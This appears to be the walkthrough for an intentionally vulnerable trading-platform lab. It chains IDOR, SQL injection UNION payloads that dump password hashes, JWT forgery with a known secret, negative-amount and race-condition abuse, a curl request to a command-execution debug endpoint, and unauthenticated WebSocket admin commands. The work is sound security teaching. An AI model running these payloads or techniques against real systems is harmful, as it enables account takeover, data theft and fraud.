# 09 — Attack Chains

## Overview
These are multi-step attack scenarios that chain 3+ vulnerabilities together for maximum impact. This is what sets VulnTrade apart from other vuln labs — real-world attacks are rarely a single exploit. Each chain represents a realistic scenario that a pentester or attacker would execute against a trading platform.

---

## Chain 1: Leaderboard Flag — Market Manipulation

**Goal:** Reach #1 on the leaderboard to unlock `FLAG{m4rk3t_m4n1pul4t0r_numb3r_0n3}`

**Difficulty:** Advanced | **Vulns chained:** 4

**Steps:**
1. **Register** a new account (`POST /api/auth/register`)
2. **Bypass KYC** — set any first name to auto-verify to Level 2 (BIZ-15)
3. **Deposit unlimited funds** — no source verification (BIZ-05): `POST /api/accounts/deposit {"amount":1000000,"sourceAccount":"fake"}`
4. **Buy VULN** — place a large market or limit order for VULN token at ~$42
5. **Discover admin.setPrice is unprotected** — the STOMP interceptor logs but doesn't block (AUTHZ-09)
6. **Manipulate VULN price** — send via WebSocket: `sendMessage('/app/admin.setPrice', {symbol:'VULN', price:99999})`
7. **Portfolio skyrockets** — VULN position now worth millions
8. **Visit leaderboard** — you're #1 → flag appears in a gold banner

**Impact in real world:** Oracle manipulation is the #1 DeFi exploit vector. This teaches the same concept in a centralized exchange context.

---

## Chain 2: Full Data Breach — IDOR + SQLi

**Goal:** Extract all user data, credentials, PII, and hidden flags

**Difficulty:** Intermediate | **Vulns chained:** 3

**Steps:**
1. **Login** with default credentials (trader1/password)
2. **Enumerate users via IDOR** — iterate `GET /api/users/1` through `/api/users/20` (AUTHZ-01)
   - Find admin notes: `FLAG{1d0r_4dm1n_pr0f1l3_n0t3s}`
   - Find trader2 SSN: `987-65-4321`
   - Find trader2 portfolio notes: `FLAG{h0r1z0nt4l_pr1v3sc_p0rtf0l10}`
3. **SQL injection via History page** — use WebSocket SQLi to dump the hidden `flags` table (INJ-02)
   - Payload: `' UNION SELECT 1, flag_name||':'||flag_value, 3, 4, now() FROM flags --`
   - Extract: `FLAG{sql1_h1dd3n_t4bl3_fl4g}`, `FLAG{b0nus_y0u_dump3d_th3_wh0l3_db}`, `FLAG{d4t4b4s3_m4st3r_k3y_3xtr4ct3d}`
4. **Dump user credentials** — `' UNION SELECT id, username||':'||password_hash, 0, 0, now() FROM users --`

**Impact in real world:** Customer data breach. Regulatory fines, legal liability, loss of trading license.

---

## Chain 3: Account Takeover — JWT Forgery + Password Change

**Goal:** Take over the admin account

**Difficulty:** Intermediate | **Vulns chained:** 3

**Steps:**
1. **Find the JWT secret** — either via `/actuator/env` (DATA-03) or hardcoded in source: `vulntrade-secret`
2. **Forge an admin JWT** — go to jwt.io, set `"role":"ADMIN"`, `"userId":1`, sign with the secret
3. **Change admin's password** — `PUT /api/auth/change-password {"newPassword":"hacked"}` with the forged token (no old password required — AUTH-08)
4. **Login as admin** with the new password

---

## Chain 4: Unlimited Money — Sign Flip + Race Condition

**Goal:** Generate unlimited account balance

**Difficulty:** Intermediate | **Vulns chained:** 3

**Steps:**
1. **Bypass account verification** — set first name to auto-verify (BIZ-15)
2. **Sign flip exploit** — withdraw negative amount: `POST /api/accounts/withdraw {"amount":-100000}` (BIZ-02)
3. **Race condition** — send 20 concurrent withdrawals of the full balance (BIZ-03). Multiple succeed before balance is updated.
4. **Alternative:** Use the unverified deposit endpoint: `POST /api/accounts/deposit {"amount":9999999,"sourceAccount":"imagination"}` (BIZ-05)

---

## Chain 5: RCE — Debug Key Discovery + Command Execution

**Goal:** Execute arbitrary commands on the server, read filesystem flags

**Difficulty:** Advanced | **Vulns chained:** 2

**Steps:**
1. **Find the debug key** — check `/actuator/env` for the key, or find `vulntrade-debug-key-2024` in the source/config
2. **Execute commands** — `POST /api/debug/execute` with `X-Debug-Key` header (INJ-06)
   ```bash
   curl -X POST http://localhost:8085/api/debug/execute \
     -H "X-Debug-Key: vulntrade-debug-key-2024" \
     -H "Content-Type: application/json" \
     -d '{"command":"cat /opt/flags/flag5.txt"}'
   ```
3. **Extract flag:** `FLAG{rc3_f1l3syst3m_4cc3ss}`
4. **Pivot:** Read `/etc/passwd`, dump environment variables, access the database from inside the container

---

## Chain 6: WebSocket Admin Privilege Escalation

**Goal:** Manipulate other users' balances and trading state

**Difficulty:** Intermediate | **Vulns chained:** 3

**Steps:**
1. **Connect to WebSocket** with any authenticated user (WS-05 — even anonymous works)
2. **Subscribe to admin alerts** — `/topic/admin/alerts` reveals `FLAG{st0mp_4dm1n_ch4nn3l_l34k}` (WS-04)
3. **Adjust balances** — `sendMessage('/app/admin.adjustBalance', {userId:1, amount:-999999, reason:"penalty"})` (WS-03)
4. **Halt trading** — `sendMessage('/app/admin.haltTrading', {symbol:'AAPL', reason:'suspicious'})` (WS-10)
5. **Resume trading** when convenient and place orders at manipulated prices

---

## Chain 7: Wash Trading + Leaderboard Gaming

**Goal:** Inflate trading statistics to top the leaderboard

**Difficulty:** Advanced | **Vulns chained:** 3

**Steps:**
1. **Place BUY order** — 1000 VULN at $42.00
2. **Place SELL order** — 1000 VULN at $42.01 (same account)
3. **Self-matching** — the matching engine executes the trade against yourself (BIZ-06)
4. **Repeat** hundreds of times to inflate trade count and volume
5. **Combine with price manipulation** — set VULN to $9999 after accumulating
6. **Check leaderboard** — massive trade count + huge ROI = #1 rank

**Impact in real world:** Wash trading is illegal under SEC regulations. In crypto, it's used to inflate exchange volume metrics. This teaches students to recognize the pattern and understand why self-match prevention is critical.
